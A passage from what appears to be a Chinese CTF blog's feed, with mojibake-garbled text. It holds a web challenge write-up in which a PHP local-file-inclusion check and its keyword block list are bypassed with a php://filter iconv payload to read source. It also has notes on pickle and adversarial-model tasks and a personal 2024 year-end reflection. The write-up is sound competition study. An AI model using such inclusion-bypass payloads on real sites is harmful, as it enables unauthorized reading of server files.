punctuation">&#125;</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pass'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"admin"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// æ”¹è¿›çš„æ­£åˆ™è¡¨è¾¾å¼ï¼Œæ£€æŸ¥æ˜¯å¦ä¸å­˜åœ¨ base|rot13|input|data|flag|file|base64 å­—ç¬¦ä¸²</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/^(?:.*(?:base|rot13|input|data|flag|file|2|5|base64|log|proc|self|env).*)$/i"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token comment">// å…ˆæ£€æŸ¥æ–‡ä»¶æ˜¯å¦åœ¨å…è®¸çš„åˆ—è¡¨ä¸­</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"prohibited prohibited!!!!"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"è¯•è¯•read.php"</span><span class="token punctuation">;</span>            <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¦æ±‚ ctfer çš„å€¼ä¸º667ï¼Œ<code>strval</code>å–å­—ç¬¦ä¸²ï¼Œ<code>strpos</code>è¿”å›å‡ºç°çš„ä½ç½®ï¼Œå³ strval åä¸èƒ½å‡ºç°7</p><p><img src="/blog/2025/01/17/2024%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B/image-20250119122729696.png" alt="image-20250119122729696"></p><p>é‚£ä¹ˆåªæœ‰åˆ©ç”¨æº¢å‡ºæ‰èƒ½ç»•è¿‡ç¬¬ä¸‰ä¸ªåˆ¤æ–­ï¼Œæˆ‘ä»¬çŸ¥é“<code>intval</code>æ˜¯å­˜åœ¨æº¢å‡ºçš„ï¼Œè€Œ strval çš„ä½œç”¨å’Œ intval ç±»ä¼¼</p><p>æµ‹è¯•å‘ç°åˆ° <code>666.99999999999999</code> å’Œ 667 ç›¸ç­‰ï¼Œé€šè¿‡ç¬¬äºŒä¸ªåˆ¤æ–­äº†ï¼Œå¤„ç†14ä½</p><p>è€Œ <code>666.999999999999</code> åœ¨ strval åå°±æ˜¯ 667ï¼Œå¤„ç†12ä½</p><p>æ‰“è¿œç¨‹çš„æ—¶å€™å‘ç°è¿™æ ·å°±ç»•è¿‡äº†ï¼Œæ¥ä¸‹æ¥å°±æ˜¯è¯»æ–‡ä»¶</p><p>æ‰¾ä¸ªèƒ½ç”¨çš„è¿‡æ»¤å™¨ç§’äº†<code>php://filter/convert.iconv.CP9066.CSUCS4/resource=read.php</code></p><p><img src="/blog/2025/01/17/2024%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B/image-20250119132840271.png" alt="image-20250119132840271"></p><hr><h1 id="FlagBotï¼ˆUnsolvedï¼‰"><a href="#FlagBotï¼ˆUnsolvedï¼‰" class="headerlink" title="FlagBotï¼ˆUnsolvedï¼‰"></a>FlagBotï¼ˆUnsolvedï¼‰</h1><p>æŠ“åŒ…ï¼Œéšä¾¿æ”¹ä¸‹signatureå‚æ•°å€¼ï¼Œç„¶åå‘è¿‡å»å¼¹debugæŠ¥é”™ç•Œé¢</p><p>æ³„éœ²å‡ºapp.py</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>        image_data <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'signature'</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> image_data<span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string">"No signature provided!"</span><span class="token punctuation">,</span> <span class="token number">400</span>        image_data <span class="token operator">=</span> image_data<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">','</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>        <span class="token keyword">if</span> pred<span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>image_data<span class="token punctuation">)</span><span class="token punctuation">,</span> model_path<span class="token operator">=</span><span class="token string">'/app/model_AlexNet.pth'</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æµ‹ï¼ŒçœŸè¦æ‰“å¤§æ¨¡å‹æ ·æœ¬å¯¹æŠ—å•Šï¼Œæœäº†ä¸€ä¸‹æ„Ÿè§‰éƒ½æ˜¯è®ºæ–‡</p><p>æ€»ä¹‹å…ˆè®¿é—®è·¯å¾„è·å– model_AlexNet.pth</p><p>ä¸æ‡‚</p><hr><h1 id="ezUploadï¼ˆUnsolvedï¼‰"><a href="#ezUploadï¼ˆUnsolvedï¼‰" class="headerlink" title="ezUploadï¼ˆUnsolvedï¼‰"></a>ezUploadï¼ˆUnsolvedï¼‰</h1><p>ä¸Šä¼ æ–‡ä»¶åŠ å¯†ï¼ŒæŠŠåŠ å¯†çš„ç»“æœæ‹¿æ¥è§£å¯†ä¼šæ‰§è¡Œpickle</p><p>æµ‹è¯•å‘ç°bançš„æ˜¯å­—æ¯ï¼šRï¼Œoï¼Œiï¼Œbï¼Œå­—æ¯åˆ å…‰äº†æˆ‘æ‰“ä»€ä¹ˆå•Š</p><p>æ‘†æ˜äº†ä¸ç»™å‘½ä»¤æ‰§è¡Œ</p><p>èƒ½ç”¨çš„ï¼ševalï¼Œsetstateï¼Œexecï¼Œtemplateï¼Œrenderï¼Œrequestsï¼Œclassï¼Œflaskï¼Œsys</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h1&gt;&lt;p&gt;ä½ ä»€ä¹ˆæ¯”èµ›ä½ æ’è¥¿æ¹–è®ºå‰‘ï¼ˆ&lt;/p&gt;
&lt;p&gt;day2çš„é¢˜æ²¡åšï¼Œæ”¾ç€ä¸ç®¡ï¼&lt;/p&gt;</summary>
    
    
    
    <category term="CTFçº¿ä¸Šèµ›" scheme="http://c1oudfl0w0.github.io/blog/categories/CTF%E7%BA%BF%E4%B8%8A%E8%B5%9B/"/>
    
    
  </entry>
  
  <entry>
    <title>2024å¹´ç»ˆæ€»ç»“</title>
    <link href="http://c1oudfl0w0.github.io/blog/2025/01/10/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/"/>
    <id>http://c1oudfl0w0.github.io/blog/2025/01/10/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/</id>
    <published>2025-01-10T15:19:30.000Z</published>
    <updated>2025-01-13T16:37:56.784Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>ç»“æŸäº†å„ç§‘æœŸæœ«è€ƒï¼Œæ”¾å¯’å‡äº†ç»ˆäºæœ‰æ—¶é—´èƒ½å†™å†™å¹´ç»ˆæ€»ç»“äº†</p><p>è¿‡å»çš„ä¸€å¹´ç»å†äº†å¾ˆå¤šäº‹æƒ…ï¼Œè½¬çœ¼é—´å¤§ä¸‰ä¸€å­¦æœŸå°±è¿‡å»äº†ï¼Œå¾ˆå¤šäº‹æƒ…éƒ½å‘ç”Ÿäº†æ”¹å˜</p><p>æ‰˜NISAå„ä½çš„ç¦ï¼Œå»äº†å¾ˆå¤šåœ°æ–¹æ‰“äº†è®¸å¤šæ¯”èµ›ï¼Œè®©æœºåœºæˆä¸ºæˆ‘è¿™ä¸ªåºŸå®…æœ€ç†Ÿæ‚‰çš„åœ°æ–¹ï¼ˆ</p><span id="more"></span><hr><h1 id="6-8æœˆ"><a href="#6-8æœˆ" class="headerlink" title="6-8æœˆ"></a>6-8æœˆ</h1><p>ä¸Šä¸€ç¯‡ Thinking å†™å‡ºæ¥çš„æ—¶å€™å¤„äºä¸€ç§è¦å­¦ä¸šæ²¡å­¦ä¸šè¦æŠ€æœ¯æ²¡æŠ€æœ¯è¦è¾“å‡ºæ²¡è¾“å‡ºè¦æ—¶é—´æ²¡æ—¶é—´çš„çŠ¶æ€ï¼Œè‡ªæˆ‘å†…è€—äº†ç›¸å½“ä¸€æ®µæ—¶é—´</p><p>æš‘å‡ hw çš„è®¡åˆ’åœ¨è¿‡äº†å‡ æ¬¡ç¬”è¯•åæ²¡ç­‰æ¥é¢è¯•ä¹‹åæ‰“æ°´æ¼‚äº†ï¼Œäºæ˜¯å°±å¾…åœ¨å®¶é‡Œæ‘†çƒ‚ï¼Œé‚£æ®µæ—¶é—´å”¯ä¸€è¦åšçš„äº‹å°±æ˜¯å‡†å¤‡CISCNå†³èµ›ï¼Œè€Œé»‘ç›¾æ¯åˆ™å› ä¸ºåˆèµ›æ²¡é˜Ÿå‹åšå…¶ä»–æ–¹å‘äºæ˜¯å¯„äº†è®©å‡ºæœºä¼šç»™å°ç™»ï¼ˆæˆ‘ä¹Ÿæƒ³åƒæ±‰å ¡qaq</p><p>ä¸å¾—ä¸è¯´æœ‰ CISCN è¿™æ ·ä¸€ä¸ªæ¯”èµ›çš„å‹åŠ›åœ¨å‰å¤´ï¼Œæ€»èƒ½æ¨ç€å»ä¸»åŠ¨æ‰¾ä¸€äº›ä¸œè¥¿æ¥å­¦ï¼Œå³ä½¿åœ¨javaè¿™é‡Œå·²ç»è¿œè¿œè½åäºå…¶ä»–å¸ˆå‚…ä¸€å¤§æˆªï¼Œä½†æ˜¯ä¹Ÿåªæœ‰è¡ŒåŠ¨æ‰èƒ½å¤Ÿæ”¹å˜è¿™æ ·çš„ç°çŠ¶</p><p>äºæ˜¯ä»æ”¾å¯’å‡åˆ°æ¯”èµ›å‰çš„æ—¥å­å¯¹ç€ drun1baby çš„åšå®¢è¡¥å…¨äº†ä¸€äº›æˆ‘è§‰å¾—å®¹æ˜“å­¦çš„ java å†…å®¹ï¼Œä¹Ÿæ˜¯è€å¿ƒæŠŠ springboot çš„åŸºç¡€ç»™å•ƒäº†ä¸‹æ¥ï¼ˆå­¦ springboot å¯¹ä¸‹ä¸ªå­¦æœŸçš„åŒºå—é“¾å®è®­ä¹Ÿå¸®ä¸Šäº†å¿™ï¼‰</p><p>å†³èµ›ä¹‹å‰æ‰“äº†æ˜¥ç§‹æ¯å¤å­£èµ›å’Œè¥¿ç“œæ¯ï¼Œæˆç»©å’Œæ¯”èµ›æ‰‹æ„Ÿéƒ½è¿˜æŒºå¥½çš„ï¼Œä¹Ÿæ˜¯ä¸Šæ‰‹äº†ä¸€ä¸‹ i æ˜¥ç§‹çš„ awdp æ¨¡å¼æå‰æœ‰äº†äº†è§£</p><p>ç„¶åå†³èµ›å°±æ˜¯é˜Ÿå‹ä»¬å„æ˜¾ç¥é€šï¼Œæˆ‘ä¹Ÿæ²¡æœ‰æ‹–åè…¿ï¼Œè™½ç„¶æœ‰ä¸€ç‚¹å°é—æ†¾æ²¡èƒ½æ‹¿åˆ°å›½ä¸€ï¼Œä½†æ˜¯ä¹Ÿæ˜¯åˆ›é€ äº†è®°å½•</p><br><p>æ‰“å®Œciscnå›æ¥ä¹‹åæˆ‘å°±è¿›å…¥äº†ä¼‘çœ æœŸï¼Œæ¯å¤©æ‰“æ‰“æ¸¸æˆå°±è¿‡å»äº†</p><p>å…«æœˆä»½å°±åªå­¦äº†ä¸€ä¸ªflaskå†…å­˜é©¬ï¼Œä¸è¿‡åœ¨ç©äº†å‡ ä¸ªæ˜ŸæœŸåå¿ƒæ€ä¹Ÿæ˜¯æ”¾å¹³äº†ä¸å°‘</p><p>ç„¶åå·…å³°æå®¢<del>ï¼ˆwebæ¯ï¼‰</del>è‡ªå·±å•cæ‹æ–­å¤§è…¿å·®ä¸€ç‚¹è¿›å†³èµ›ï¼Œæˆ‘çš„ä¸»åŠæ–¹æŠ¥é”€å››å·æ¸¸ğŸ˜­</p><p>nepctfæ··äº†ä¸ªä¸‰è¡€ä¹Ÿå°±åªå‡ºäº†è¿™ä¸€é“é¢˜ï¼Œdasctfå…«æœˆèµ›ä¹Ÿåªç­¾äº†ä¸ªåˆ°</p><p>æœˆåº•åˆç»™è‡ªå·±ä¸Šå¼ºåº¦äº†ï¼Œç¾ŠåŸæ¯+æ”»é˜²æ¼”ç»ƒ+é«˜æ•°ä¸‹è¡¥è€ƒï¼ˆ</p><p>æœ€åé«˜æ•°ä¹Ÿæ˜¯è¿‡äº†ï¼Œå¤§äºŒä¸‹å–œææ— æŒ‚ç§‘è®°å½•ï¼Œå¯å–œå¯è´ºå¯å–œå¯è´º</p><hr><h1 id="â‘¨æœˆ"><a href="#â‘¨æœˆ" class="headerlink" title="â‘¨æœˆ"></a>â‘¨æœˆ</h1><p>æ‰“å®Œæ”»é˜²æ¼”ç»ƒå’Œç¾ŠåŸæ¯åˆèµ›ä¹‹åï¼Œå·¨é­”å¸Œæœ›æˆ‘æ¥ä¸‹æ¥èƒ½ç ”ç©¶ javaï¼Œå³ä½¿åä¼šé‡Œæ²¡æœ‰webå‰è¾ˆèƒ½èµ°åˆ°è¿™ä¸€æ­¥ï¼Œé‚£ä¹ˆæˆ‘å°±æ¥æˆä¸ºç¬¬ä¸€ä¸ªå§</p><p>äºæ˜¯å¼€å§‹è¸è¸å®å®è¿‡ccé“¾çš„è¿›åº¦ï¼Œå¼€å­¦æ²¡å•¥äº‹ä¸€å¤©ä¸€æ¡å­¦è¿‡å»ï¼Œé€æ¸æœ‰äº†ä¸€ç‚¹å­¦javaçš„æ„Ÿè§‰ï¼Œäºæ˜¯javaè¿›åº¦æ¨äº†ä¸å°‘</p><p>ç„¶åå‘¢æ˜¯ç¾ŠåŸæ¯å†³èµ›ï¼Œç»™é«˜ç«¯å£å¡äº†ä¸€æ—©ä¸Šæˆ‘æ˜¯æ²¡æƒ³åˆ°çš„ï¼Œæˆ‘æè¿™å®¡äº†ä¸€æ—©ä¸Šçš„tpæºç ï¼Œæœ€ååªèƒ½è¯´æ˜¯è¾“ç»™äº†æ—¶é—´ä¸è¶³</p><p>æ¥ä¸‹æ¥å°±æ˜¯è¿™å­¦æœŸé‡Œæœ€æœ‰æˆå°±æ„Ÿçš„ä¸€æ¬¡æ¯”èµ›â€”â€”SCTFï¼Œåœ¨æ²¡æœ‰ä»»ä½•é˜Ÿå‹ä»…å‡­ä¸€å·±ä¹‹åŠ›çš„æƒ…å†µä¸‹è§£å‡ºé¢˜ç›®å¹¶æ‹¿ä¸‹äº†ä¸‰è¡€ï¼Œxctfå¹¶éä¸å¯æˆ˜èƒœ</p><hr><h1 id="10æœˆ"><a href="#10æœˆ" class="headerlink" title="10æœˆ"></a>10æœˆ</h1><p>è¿™ä¸ªæœˆåŸºæœ¬å°±æ˜¯æ¯å‘¨å‘¨æœ«éƒ½æ‰“ä¸€ä¸ªæ¯”èµ›ï¼ŒGeekGameå¥½ç©</p><p>ç„¶åå°±æ²¡å¹²å•¥äº†ï¼Œæ¯å¤©èµ¶èµ¶å„ç§è¯¾çš„å®éªŒæŠ¥å‘Šå’Œä½œä¸šï¼ŒèŠ±æ—¶é—´å‡†å¤‡ä¸€ä¸‹æœŸä¸­è€ƒï¼Œæ²¡å­¦ä»€ä¹ˆæ–°ä¸œè¥¿</p><hr><h1 id="11æœˆ"><a href="#11æœˆ" class="headerlink" title="11æœˆ"></a>11æœˆ</h1><p>æœ€ç–¯ç‹‚çš„ä¸€ä¸ªæœˆï¼Œå¼ºç½‘æ¯åˆèµ›æ‰€æœ‰äººæ‹¼å°½å…¨åŠ›æœ€ç»ˆæ‹¿ä¸‹ï¼Œç®—æ˜¯åˆ›é€ äº†NISAä¸€ä¸ªéš¾ä»¥é€¾è¶Šçš„é«˜å³°</p><p>ç„¶åæ¯å‘¨éƒ½å‡ºå·®ï¼Œå‡ºå·®æ‰“ç½‘é¼æ¯ï¼Œå‡ºå·®æ‰“å·¥ä¸šäº’è”ç½‘ï¼Œå‘¨ä¸‰å‘¨å››çš„è¯¾ä¸»æ‰“ä¸€ä¸ªå…¨ç¿˜äº†ï¼ˆ</p><p>ç½‘é¼æ¯åŠå†³èµ›æ¸—é€åº”å‡ºæœªå‡ºçš„å¼±å¯†ç ï¼Œæˆ‘ä¸ä¼šæ”¾è¿‡ä½ çš„ğŸ‘ï¼ŒæŸç§æ„ä¹‰ä¸Šè¿™å¯¼è‡´äº†åé¢é˜Ÿå‹çš„é€€å½¹ï¼Œå”‰å”‰</p><hr><h1 id="12æœˆ"><a href="#12æœˆ" class="headerlink" title="12æœˆ"></a>12æœˆ</h1><p>å¼ºç½‘æ¯å†³èµ›ï¼Œæ€§è´¨ä¸Šæ„Ÿè§‰å±äºè¡¨æ¼”èµ›ï¼Œä½†æ˜¯æ°¸ä¹…ä¼šåœºåœºé¦†çš„è§„æ¨¡æ˜¯çœŸnbå•Šï¼Œä¸»åŠæ–¹æŠ¥é”€çœŸnbå•Š</p><p>éš¾ä»¥ç½®ä¿¡ï¼Œæ€ä¹ˆå›æ¥å°±è¦å‡†å¤‡é¢å¯¹ä¸€å †å¤§ä½œä¸šçš„ddlå’ŒæœŸæœ«è€ƒäº†ï¼Œå¾ˆå®Œè›‹å‘¢ï¼Œä¸è¿‡ä¸ä¼šå†æœ‰å“ªç§‘ä¼šæŒ‚äº†ï¼ˆä¼šèµ¢çš„.jpg</p><p>ä¸­é—´æ‰“äº†ä¸€ä¸‹ CCB&amp;CISCNï¼Œå“å§æ§½ccbæ€ä¹ˆè¿™ä¹ˆåğŸ˜­ï¼Œä¸€è§‰é†’æ¥NISAå®åŠ›ä¸‹é™ä¸€ä¸‡å€ï¼Œæœç„¶ä¸¤ä½æ ¸å¿ƒçš„é€€å½¹è¿˜æ˜¯ç»™NISAå¸¦æ¥äº†é‡åˆ›</p><p>DASç»å…¸webçˆ†é›¶ï¼Œä»€ä¹ˆæ—¶å€™æˆ‘æ‰èƒ½åœ¨ dasctf ä¸Šåšå‡ºä¸€ç‚¹é«˜è´¨é‡é¢˜ç›®å•ŠğŸ˜«</p><hr><h1 id="present"><a href="#present" class="headerlink" title="present"></a>present</h1><p>ä¾æ—§æ˜¯æŸé»˜é»˜æ— é—»çš„åå…«çº¿webğŸ•</p><p>åˆæ˜¯è¢«å¤§ä½¬ä»¬çš„å¹´åº¦æ€»ç»“æ‰€éœ‡æ’¼çš„ä¸€å¹´ï¼Œç¾¡æ…•å¤§bå“¥å¤§ä¸‰å°±èƒ½æœ‰ç­ä¸Šï¼Œå¹´åº•è¿˜æœ‰å¥½å‡ å®¶offerï¼ˆ</p><p>çœ‹çœ‹æˆ‘è¿™ä¸€å¹´å¹²äº†ä»€ä¹ˆå‘¢ï¼Œçœ‹ç€è¿™ä¹ˆå¤šçš„æ¯”èµ›ç»å†æŒºé£å…‰çš„ï¼Œå®åˆ™éƒ½æ˜¯æ‰˜äº†é˜Ÿå‹çš„ç¦ï¼Œå¤´èµ·å¤ªé«˜ä¹Ÿä¸æ˜¯ä»€ä¹ˆå¥½äº‹ï¼Œè¿™æ ·åé¢çš„è½å·®ä¼šç›¸å½“å¤§ï¼ˆ</p><p>è‡ªä¸»codingèƒ½åŠ›ä¾æ—§ç¨€çƒ‚ï¼Œå†™ä¸ªè„šæœ¬éƒ½å¾—è·ŸGPTäº¤æµåŠå¤©ï¼Œè¿™ä»¥åè¿˜æ€ä¹ˆå†™å·¥å…·åšæ­¦å™¨åŒ–å•Š(â•¯â€µâ–¡â€²)â•¯ï¸µâ”»â”â”»</p><p>ä¹Ÿæ˜¯å¯Ÿè§‰åˆ°äº†è‡ªå·±çš„ä¸€ä¸ªé—®é¢˜ï¼Œåšé¢˜é€Ÿåº¦å¤ªæ…¢ï¼Œåªæœ‰åœ¨å‡Œæ™¨çš„æ—¶å€™æ•ˆç‡å¤§å¹…æå‡ï¼Œç®€å•é¢˜éƒ½å¾—èŠ±ä¸å°‘æ—¶é—´ï¼Œä¸çŸ¥é“æ˜¯ä¸æ˜¯å­¦å¾—è¿‡æ‹Ÿåˆäº†ï¼ˆ</p><p>è²Œä¼¼é™·å…¥äº†æ‰“æ¯”èµ›çˆ†é›¶â€”â€”èŠ±å¤§æŠŠæ—¶é—´å¤ç°é¢˜ç›®â€”â€”æ²¡æ—¶é—´å­¦æ–°ä¸œè¥¿â€”â€”æ‰“æ¯”èµ›çˆ†é›¶çš„å¾ªç¯ï¼Œæ€»ä¹‹ç°åœ¨è¦å¤ç°çš„ä¸œè¥¿å·²ç»å †æˆå±±äº†ï¼Œå“ˆå“ˆğŸ˜„</p><p>ä½†æ˜¯æ²¡å•¥å…³ç³»ï¼Œæ¯æ¬¡æ‰“æ¯”èµ›éƒ½èƒ½é€¼ç€è‡ªå·±å»å­¦ä¸€äº›æ–°çš„ä¸œè¥¿ï¼Œå»äº«å—åç‰¢çš„è¿‡ç¨‹ï¼Œä¸»æ‰“ä¸€ä¸ªç»™è‡ªå·±ä¸Šå¼ºåº¦ï¼Œhh</p><hr><h1 id="future"><a href="#future" class="headerlink" title="future"></a>future</h1><p>å–œæŠ¥ï¼šä¸‹å­¦æœŸå¼€å§‹æ²¡æœ‰è¦é‡ä¿®çš„ç§‘ç›®äº†ï¼ï¼ˆä¹</p><p>å…³äºå®ä¹ ï¼Œå¾ˆæ·¦çš„ä¸€ç‚¹æ˜¯æˆ‘ä»¬å®ä¹ çš„æ–¹å¼æ˜¯æŠ•ç¥¨é€‰æ‹©çš„ï¼Œæœ€ç»ˆçš„æŠ•ç¥¨ç»“æœæ˜¯å­¦æ ¡å®‰æ’é›†ä¸­å®ä¹ ï¼Œemmmï¼Œè¿™tmæ˜¯ä¸æ˜¯è¦å»æ‰“é»‘å·¥äº†ï¼Œæ›´æ·¦çš„æ˜¯è¿™ä¸ªå®ä¹ è¿˜è®¾ç½®åœ¨äº†å¤§å››ä¸Šï¼Œå—¯æ²¡é”™ï¼Œæˆ‘ä»¬äº²çˆ±çš„è®¡ç»„è®¾ç½®åœ¨äº†å¤§ä¸‰ä¸‹æ¥ä¸Šï¼Œç„¶åçœ‹äº†ä¸‹å¤§ä¸‰ä¸‹çš„è¯¾è¡¨ã€‚ã€‚ã€‚å‘¨å…­æ’è¯¾ä¹Ÿæ˜¯ç¥äººäº†ï¼›ä¾æ—§æ˜¯ä¸€å¤§å †æ²¡å•¥ç”¨çš„å®è®­ â‰ˆ ä¸€å¤§å †è¯¾æ—©å…«åˆäºŒ â‰ˆ ä¸€å¤§å †å¤§ä½œä¸šï¼Œæˆ‘nmä¸Šä¸ªå¤§å­¦æ€ä¹ˆè¿™ä¹ˆå¤šäº‹.jpg</p><p>æ¸—é€ï¼Œå…³äºåŸŸåªèƒ½è¯´æ˜¯ä¸€ç‚¹ä¸ä¼šï¼Œæ˜¥ç§‹äº‘å¢ƒçœ‹æ¥å¾—æä¸Šæ—¥ç¨‹äº†ï¼Œä¸ç„¶æ‰“å›½èµ›éƒ½è´¹åŠ²</p><p>åè¾ˆçš„åŸ¹å…»ï¼Œè€å®è¯´ï¼Œæˆ‘ä¸æ˜¯å¾ˆèƒ½ç†è§£è¿™ä¸ªbå­¦åˆ†ç»©ç‚¹ä¸ºä»€ä¹ˆé‚£ä¹ˆå¸å¼•äººï¼Œè¿™ä¸¤å±Šæ‹›è¿‡æ¥çš„ç»å¤§å¤šæ•°äººåŠŸåˆ©æ€§éƒ½ååˆ†æ˜æ˜¾ï¼Œå¥”ç€æ¯”èµ›åŠ å­¦åˆ†ä¿ç ”æ¥çš„ï¼Œæ•´å¤©æƒ³è®©åˆ«äººå¸¦å¸¦ï¼Œè‡ªå·±å­¦çš„ä¸œè¥¿æ˜¯ä¸€ç‚¹è¿›å±•æ²¡æœ‰ï¼Œå„ä¸ªæ¯”èµ›ä¹Ÿæ²¡å•¥ç§¯ææ€§ï¼Œåªæœ‰ä¼šåŠ å­¦åˆ†çš„æ‰æŠ¥ä¸€ä¸‹ï¼ŒçœŸå®Œè›‹woc</p><p>ç„¶åå‘¢ï¼Œæ–°çš„ä¸€å¹´ä¼°è®¡æˆ‘è¿˜ä¼šæ˜¯é‚£ä¸ªè‡­èµ›æ£ï¼ˆ</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h1&gt;&lt;p&gt;ç»“æŸäº†å„ç§‘æœŸæœ«è€ƒï¼Œæ”¾å¯’å‡äº†ç»ˆäºæœ‰æ—¶é—´èƒ½å†™å†™å¹´ç»ˆæ€»ç»“äº†&lt;/p&gt;
&lt;p&gt;è¿‡å»çš„ä¸€å¹´ç»å†äº†å¾ˆå¤šäº‹æƒ…ï¼Œè½¬çœ¼é—´å¤§ä¸‰ä¸€å­¦æœŸå°±è¿‡å»äº†ï¼Œå¾ˆå¤šäº‹æƒ…éƒ½å‘ç”Ÿäº†æ”¹å˜&lt;/p&gt;
&lt;p&gt;æ‰˜NISAå„ä½çš„ç¦ï¼Œå»äº†å¾ˆå¤šåœ°æ–¹æ‰“äº†è®¸å¤šæ¯”èµ›ï¼Œè®©æœºåœºæˆä¸ºæˆ‘è¿™ä¸ªåºŸå®…æœ€ç†Ÿæ‚‰çš„åœ°æ–¹ï¼ˆ&lt;/p&gt;</summary>
    
    
    
    <category term="Thinking" scheme="http://c1oudfl0w0.github.io/blog/categories/Thinking/"/>
    
    
  </entry>
  
  <entry>
    <title>ç¬¬å…«å±Šå·¥ä¸šä¿¡æ¯å®‰å…¨æŠ€èƒ½å¤§èµ›å¤èµ›</title>
    <link href="http://c1oudfl0w0.github.io/blog/2025/01/09/%E7%AC%AC%E5%85%AB%E5%B1%8A%E5%B7%A5%E4%B8%9A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%A4%8D%E8%B5%9B/"/>
    <id>http://c1oudfl0w0.github.io/blog/2025/01/09/%E7%AC%AC%E5%85%AB%E5%B1%8A%E5%B7%A5%E4%B8%9A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%A4%8D%E8%B5%9B/</id>
    <published>2025-01-09T01:09:17.000Z</published>
    <updated>2025-01-13T16:27:13.746Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>Go to æµ·å—ï¼Œåœ¨è¿™ä¸ªå¯’å†·çš„å†¬å¤©ç©¿ä¸Šä¸€ä»¶çŸ­è¢–</p><span id="more"></span><hr><h1 id="æ¸¯å£å·¥ä¸šæŒ‘æˆ˜åŒº"><a href="#æ¸¯å£å·¥ä¸šæŒ‘æˆ˜åŒº" class="headerlink" title="æ¸¯å£å·¥ä¸šæŒ‘æˆ˜åŒº"></a>æ¸¯å£å·¥ä¸šæŒ‘æˆ˜åŒº</h1><p>çœ‹ä¸æ‡‚ï¼Œè¿ç¯å¢ƒåœ¨å“ªéƒ½æ²¡æ‰¾åˆ°</p><p>æ®è¯´æ˜¯æ‰«bæ®µï¼Œä½†æ˜¯æˆ‘æ‰«å‡ºæ¥çš„å‡ ä¸ªéƒ½æ²¡æ³•è®¿é—®ï¼Œä¸ä¼šè¦æ‹¿å·¥æ§è½¯ä»¶è¿å§</p><hr><h1 id="è½¦è·¯äº‘å®‰å…¨æŒ‘æˆ˜åŒº"><a href="#è½¦è·¯äº‘å®‰å…¨æŒ‘æˆ˜åŒº" class="headerlink" title="è½¦è·¯äº‘å®‰å…¨æŒ‘æˆ˜åŒº"></a>è½¦è·¯äº‘å®‰å…¨æŒ‘æˆ˜åŒº</h1><p>è½¦è”ç½‘æ„å¤–çš„å¾ˆèƒ½æ‰“ï¼Œæœ€ååœ¨ä¸€å 